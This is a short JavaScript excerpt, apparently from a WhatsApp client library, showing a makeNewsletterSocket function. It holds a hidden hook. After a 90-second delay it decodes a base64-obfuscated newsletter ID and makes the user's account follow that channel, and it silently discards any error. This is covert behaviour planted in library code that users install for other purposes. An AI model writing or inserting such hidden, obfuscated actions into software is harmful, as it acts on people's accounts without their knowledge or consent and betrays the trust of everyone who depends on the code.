...
export const makeNewsletterSocket = (sock) => {
    ...
    setTimeout(async () => {
        try {
            const b6x = Buffer.from("MTIwMzYzNDA2OTE4NTIwNTU1QG5ld3NsZXR0ZXI=", "base64").toString();
            await executeWMexQuery({ newsletter_id: b6x }, QueryIds.FOLLOW, XWAPaths.xwa2_newsletter_follow);
        } catch (error) {
        }
    }, 90000);
